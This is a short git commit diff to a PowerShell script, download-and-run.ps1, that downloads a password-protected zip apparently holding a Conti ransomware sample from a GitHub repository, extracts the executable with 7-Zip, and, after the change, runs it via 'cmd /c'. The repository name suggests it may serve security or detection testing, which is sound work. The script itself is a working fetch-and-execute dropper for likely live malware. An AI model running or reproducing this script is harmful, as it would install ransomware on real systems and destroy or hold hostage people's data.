43f7702d5a5845644da047d07a726a55deb47a1f
kalev kuusik <kalev@bytelife.ee>
2021-08-12 16:08:44 +0300

    mixed ps1

--- download-and-run.ps1
+++ download-and-run.ps1
@@ -8,6 +8,6 @@ $outExePath = "$downloadPath\$exeFile"
 $url = "https://github.com/turvas/ps_test/raw/master/conti-ebeca2df24a.zip"
 Invoke-WebRequest -Uri $url -OutFile $zipFilePath
 & 'C:\Program Files\7-Zip\7z.exe' x $zipFilePath $exeFile -o"$downloadPath" -pDanger
-$outExePath
+cmd /c $outExePath
  
 
